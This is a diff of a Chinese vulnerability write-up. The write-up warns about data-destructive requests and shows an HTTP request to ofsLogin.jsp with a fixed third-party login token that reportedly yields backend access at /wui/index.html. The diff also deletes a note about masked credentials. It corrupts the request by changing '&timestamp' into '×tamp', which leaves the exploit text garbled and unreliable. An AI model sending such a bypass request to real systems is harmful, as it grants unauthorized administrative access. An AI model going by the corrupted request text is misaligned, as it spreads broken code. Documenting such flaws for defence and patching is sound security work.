@@ -42,7 +42,7 @@ schema_version: "1"
 
 ## 操作风险
 
-请求可能删除/覆盖数据、修改账号或持久改变业务状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+请求可能删除/覆盖数据、修改账号或持久改变业务状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。
 
 ## 技术资料与来源记录
 
@@ -619,7 +619,7 @@ public int getUserId(String var1) {
 然后作如下请求，便能成功进入系统后台 `/wui/index.html`页面。
 
 ```http
-GET /mobile/plugin/1/ofsLogin.jsp?syscode=1&timestamp=1&gopage=/wui/index.html&receiver=user1&loginTokenFromThird=793527b3f4855296c85629a7271e20e7 HTTP/1.1
+GET /mobile/plugin/1/ofsLogin.jsp?syscode=1×tamp=1&gopage=/wui/index.html&receiver=user1&loginTokenFromThird=793527b3f4855296c85629a7271e20e7 HTTP/1.1
 Host: 
 User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
 Accept-Encoding: gzip, deflate
